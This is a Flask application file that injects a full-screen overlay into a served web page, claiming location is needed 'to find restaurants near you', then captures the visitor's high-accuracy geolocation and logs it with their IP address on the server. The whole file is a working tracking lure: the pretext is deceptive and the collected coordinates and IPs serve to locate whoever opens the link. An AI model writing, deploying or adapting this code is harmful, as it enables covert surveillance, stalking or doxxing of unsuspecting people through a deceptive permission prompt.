# app.py
import os
import re
import logging
import sys
from pathlib import Path
from flask import Flask, request, Response, jsonify

app = Flask(__name__)

# Which file to inject into (relative to project root). Default: ./page.html
PAGE_FILE = os.environ.get("PAGE_FILE", "page.html")

# configure logging to stdout so Render captures it
handler = logging.StreamHandler(sys.stdout)
handler.setLevel(logging.INFO)
app.logger.addHandler(handler)
app.logger.setLevel(logging.INFO)

# Overlay HTML to inject (non-branded). You can edit the text below.
OVERLAY_HTML = r'''
<!-- GEO-INJECT-START -->
<style>
#geo-inject-overlay {
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,0.86);
  color: #fff;
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 999999;
  padding: 20px;
  text-align: center;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
}
#geo-inject-card { max-width: 420px; }
#geo-inject-title { font-size: 20px; margin-bottom: 12px; }
#geo-allow-btn {
  background: #E31837;
  color: white;
  border: none;
  padding: 12px 18px;
  font-size: 16px;
  border-radius: 8px;
  cursor: pointer;
}
#geo-allow-btn:disabled { opacity: 0.7; cursor: default; }
</style>

<div id="geo-inject-overlay">
  <div id="geo-inject-card" role="dialog" aria-modal="true" aria-labelledby="geo-inject-title">
    <div id="geo-inject-title">We need your location to find restaurants near you</div>
    <div>
      <button id="geo-allow-btn" type="button">Allow</button>
    </div>
  </div>
</div>

<script>
(function () {
  const OVERLAY_ID = 'geo-inject-overlay';
  const btn = document.getElementById('geo-allow-btn');

  // If user clicks "Allow", open the browser/OS permission prompt
  btn && btn.addEventListener('click', function () {
    if (!navigator.geolocation) {
      alert('Geolocation is not supported by this browser.');
      return;
    }

    btn.disabled = true;
    btn.textContent = 'Requesting…';

    navigator.geolocation.getCurrentPosition(
      function (position) {
        // prepare payload
        const payload = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          timestamp: position.timestamp
        };

        // send to server (same origin)
        fetch('/log_location', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        }).then(function () {
          // remove overlay on success (or regardless)
          const ov = document.getElementById(OVERLAY_ID);
          if (ov) ov.remove();
        }).catch(function (e) {
          console.warn('Error sending location:', e);
          alert('Failed to send location to server.');
        });
      },
      function (err) {
        console.warn('Geolocation error', err);
        // user denied or error — keep overlay or remove depending on desired behavior
        alert('Location permission denied or timed out.');
        btn.disabled = false;
        btn.textContent = 'Allow';
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });
})();
</script>
<!-- GEO-INJECT-END -->
'''

def load_and_inject(path):
    p = Path(path)
    if not p.exists():
        raise FileNotFoundError(f"Page file not found: {path}")
    html = p.read_text(encoding='utf-8')
    # insert overlay before closing </body> if present, else append at end
    body_close_re = re.compile(r'</body\s*>', flags=re.IGNORECASE)
    if body_close_re.search(html):
        injected = body_close_re.sub(OVERLAY_HTML + '</body>', html, count=1)
    else:
        injected = html + OVERLAY_HTML
    return injected

@app.route('/')
def index():
    try:
        injected_html = load_and_inject(PAGE_FILE)
    except Exception as exc:
        app.logger.exception("Failed to load or inject page file")
        return f"Error loading page: {exc}", 500

    # log visitor IP on page view
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    app.logger.info(f"Page view from IP: {ip}")
    return Response(injected_html, mimetype='text/html')

@app.route('/log_location', methods=['POST'])
def log_location():
    data = request.get_json(silent=True) or {}
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    lat = data.get('latitude')
    lon = data.get('longitude')
    acc = data.get('accuracy')
    ts = data.get('timestamp')
    app.logger.info(f"Location received — IP: {ip} | lat: {lat} | lon: {lon} | acc: {acc} | ts: {ts}")
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    # for local testing: python app.py
    app.run(host='0.0.0.0', port=port)
